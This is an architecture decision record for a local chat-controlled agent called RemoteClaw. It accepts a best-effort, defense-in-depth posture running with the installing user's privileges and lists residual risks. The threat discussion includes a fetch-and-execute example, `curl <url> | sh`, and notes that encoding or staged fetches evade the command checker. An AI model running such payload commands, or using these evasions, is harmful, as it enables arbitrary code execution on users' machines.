# 0004. Security posture: best-effort defense-in-depth, run as the installing user

- Status: accepted
- Date: 2026-07-13
- Supersedes the "privilege-separated executor" proposal previously drafted under this number.

## Context

ADR 0003 shipped a config/secret lockdown and floated a follow-up: a
"privilege-separated executor" that would run agent-driven commands as a
*different, lower-privilege* user than the service core, to make config/secrets
unreadable by the agent "even as admin, via any command."

Working through the mechanics showed that goal is both **unbuildable as framed**
and **misaligned with how RemoteClaw actually runs**:

1. **RemoteClaw runs with the installing user's privileges — this is inherent.**
   It is a local agent the user installs and runs to act on their behalf. Its
   privileges are exactly the user's: if the user is an administrator, RemoteClaw
   is an administrator. There is no getting around this and it is not a defect —
   it is the nature of "remote hands for *your* machine."

2. **You cannot setuid from one unprivileged user to another.** Dropping to a
   distinct low-privilege worker requires the parent to hold `CAP_SETUID` (root)
   on Linux or `SeAssignPrimaryTokenPrivilege` (SYSTEM) on Windows. A
   non-privileged RemoteClaw cannot spawn a lower-privileged child. So true
   privilege separation would require RemoteClaw to run as root/SYSTEM — the
   opposite of "least privilege" and contrary to point 1.

3. **Runtime model.** Headless operation needs a service account: straightforward
   on Linux/macOS (systemd `--user` or a system unit). On **Windows** running as
   a true service requires an Authenticode-signed binary, so the practical model
   there is **run-at-login** — RemoteClaw runs in the user's session (e.g. the
   user logs in, locks the screen, and it keeps running with their privileges).

### The limitation we are explicit about

If an attacker gains authenticated access to the bot, they can instruct
RemoteClaw to fetch and run a payload — e.g. `curl <url> | sh` or download-then-
execute. **No amount of command checking, confirmation gating, or least-
privilege posture prevents this**, because the payload runs with the user's own
privileges, which RemoteClaw legitimately has. The dangerous-command checker can
be evaded (encoding, indirection, staged fetch); the challenge only gates
commands the checker *flags*; least privilege doesn't help when "least" is
already "the user." This is a real, accepted residual risk.

## Decision

**Adopt an explicit best-effort, defense-in-depth posture. Do not build
privilege separation or claim an airtight boundary.**

- RemoteClaw runs as the **installing user** (or a dedicated service account for
  headless use). Its privileges equal that user's; this is by design.
- The security layers — email allowlist, per-space rate limit, dangerous-command
  checker, AES-GCM challenge-response for destructive commands, in-process
  config/secret lockdown guard (ADR 0003), and audit logging — are **layers that
  raise the cost and narrow the surface** for a *remote* attacker abusing the
  chat interface. They are **not** claimed to stop a determined attacker who can
  deliver and execute a payload with the user's privileges.
- The **challenge-response** remains the strongest single control precisely
  because its authorizing secret lives *off the machine*, in the operator's head
  — but it only covers commands that reach the confirmation path.
- The operator is informed of and accepts this risk. The goal is "meaningful,
  layered friction and traceability," explicitly **not** "impregnable."

## Consequences

- **Honest and buildable.** We stop chasing a guarantee the architecture can't
  provide and document what the layers actually do. No root-monitor rewrite, no
  setuid worker, no cross-platform token juggling.
- **The shipped controls stand** as valid best-effort layers; nothing from ADR
  0003 is removed. The in-process lockdown guard remains defense-in-depth (it
  raises the bar against casual/naive secret access; it does not stop a crafted
  command).
- **Accepted residual risk:** an authenticated attacker can run arbitrary code
  as the user (payload delivery). Mitigations that *reduce likelihood* — strict
  allowlist, keeping the bot token secret, challenge-response on destructive
  ops, and audit review — matter more than any attempt at hard containment.
  Operators who need containment should run RemoteClaw in an already-sandboxed
  environment (dedicated VM/container/low-privilege account) — an *external*
  boundary, not one RemoteClaw can impose on itself.
- **Follow-up (tracked, not in this change):** PR #2's installer provisions a
  dedicated low-privilege `remoteclaw` service user and a system service. That
  should be realigned to the run-as-installing-user / run-at-login model
  described here (keeping the service account as an explicit headless option).
  Deferred to a separate, reviewed change.

## Relationship to prior ADRs

- **ADR 0003** stands. Its in-process guard and `pass` secret storage are
  best-effort layers consistent with this posture. This ADR retires only ADR
  0003's aspiration that OS enforcement could make the guarantee *airtight*.
